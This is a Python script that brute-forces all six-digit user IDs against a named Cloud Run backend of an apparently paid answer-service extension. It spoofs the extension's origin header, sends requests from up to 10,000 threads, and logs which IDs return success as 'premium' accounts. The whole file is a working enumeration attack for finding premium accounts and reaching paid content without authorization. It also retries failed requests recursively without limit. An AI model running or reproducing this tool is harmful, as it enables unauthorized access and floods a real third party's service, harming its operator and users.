import requests
import threading
import queue
import time
import json

wq = queue.Queue()
tpids = 0
running = False

class queueManager:
    totalChecked: int = 0
    outputPath: str = "pid.json"
    def __init__(self):
        self.writeProcess()

    def readPID(self) -> dict:
        with open(self.outputPath, "r", encoding="utf-8") as f:
            data = json.loads(f.read())
            f.close()
        return data
    
    def writePID(self, data: dict) -> None:
        with open(self.outputPath, "w", encoding="utf-8") as f:
            f.write(json.dumps(data, indent=4))
            f.close()

    def writeProcess(self):
        while running:
            while not wq.empty():
                data = wq.get()
                if isinstance(data, dict):
                    self.totalChecked += 1
                    base_json = self.readPID()
                    for _ in data:
                        base_json[_] = data[_]
                    self.writePID(base_json)
                elif isinstance(data, str):
                    print(f"{round((self.totalChecked/tpids)*100, 2)}% | {data}", end="\r")
            time.sleep(0.5)

class Client:
    def __init__(self, client: requests.Session):
        self.client = client
    
    def doRequests(self, method: str, url: str = "", params: str | dict = "", json: dict = {}, data: dict = {}, headers: dict = {}):
        requestsObject: requests
        try:
            match method.lower():
                case "get":
                    requestsObject = self.client.get
                case "post":
                    requestsObject = self.client.post
                case _:
                    requestsObject = self.client
            return requestsObject(url=url, params=params, json=json, data=data, headers=headers)
        except:
            return self.doRequests(method=method, url=url, params=params, json=json, data=data, headers=headers)


class Brute:
    endpoint: str = "https://tool-eop-v3-backend-wszmtm2dda-uc.a.run.app"
    thread: int
    ranged: tuple
    def __init__(self, thread: int = 1, ranged: tuple = ("000000", "999999")) -> None:
        global tpids
        tpids = int(ranged[1]) - int(ranged[0]) + 1
        self.session = requests.Session()
        self.session.headers.update({
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,vi;q=0.8,fr;q=0.7',
            'content-type': 'application/json',
            'origin': 'chrome-extension://imlhhjancockeaeacdfajpmmdpaceilj',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        })
        self.client = Client(self.session)
        self.thread = thread
        self.ranged = ranged

    def check(self, id: str | list) -> dict:
        global wq
        def status(id) -> bool:
            api = f"{self.endpoint}/task-answer/answers"
            json_data = {
                "major": "1",
                "unit": "0",
                "task": "1",
                "userId": self.toString(id)
            }
            response = self.client.doRequests(method="post", url=api, json=json_data)
            wq.put({self.toString(id): "*premium*" if response.status_code == 200 else "non-premium"})
            wq.put(f"[Checking] {id}:{response.status_code}")
            return response.status_code == 200
        if isinstance(id, str):
            status(id)
        elif isinstance(id, list):
            for _ in id:
                status(_)
        return {}
    
    def toString(self, id: int) -> str:
        return "0" * (6-len(str(id))) + str(id)
    
    def threadingManager(self):
        global running
        running = not running

        start = int(self.ranged[0])
        end = int(self.ranged[1])
        total = end - start + 1
        if total < self.thread:
            self.thread = total
        base = total // self.thread
        residual = total % self.thread
        threads = {}
        cursor = start
        for i in range(self.thread):
            threads[i] = []
            count = base + (1 if i < residual else 0)
            for _ in range(count):
                threads[i].append(self.toString(cursor))
                cursor += 1

        # print( residual,  self.thread, threads)
        thread = []
        for _ in threads:
            thread.append(threading.Thread(target=self.check, args=(threads[_],)))
        thread.append(threading.Thread(target=queueManager))
        for _ in thread:
            _.start()
        for _ in range(len(thread)-1):
            thread[_].join()
        running = not running

if __name__ == "__main__":
    bf = Brute(10000, ("0","999999"))
    # print(bf.check("123"))
    bf.threadingManager()
        